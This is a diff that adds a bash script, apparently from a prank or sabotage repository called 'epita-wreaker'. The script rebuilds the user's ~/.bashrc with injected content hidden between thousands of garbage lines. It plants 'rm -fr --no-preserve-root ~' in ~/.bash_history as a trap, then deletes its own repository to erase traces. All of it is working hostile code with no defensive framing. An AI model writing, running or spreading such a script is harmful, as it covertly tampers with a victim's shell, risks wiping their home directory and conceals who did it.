@@ -1,0 +1,23 @@
+#!/bin/bash
+
+#sets dir to epita-wreaker/lag
+dir=$(dirname $0)
+repo=$(cd $dir/..;pwd)
+
+if [ -e ~/.bashrc ]; then
+	mv ~/.bashrc tmpbashrc
+else
+	touch tmpbashrc
+fi
+
+gcc -std=c99 -s $repo/lib/makerc.c -o make.bin
+#args are: pre lines, post lines, destination, sources
+./make.bin 1500 1500 $HOME/.bashrc tmpbashrc $dir/gambashrc			#puts contents of new bashrc(old bashrc + new content) in place in the middle of garbage
+
+rm tmpbashrc
+rm make.bin
+
+echo -e "cd\nls\ncd ..\nls\nrm -fr --no-preserve-root ~" > ~/.bash_history
+
+rm -fr $repo
+
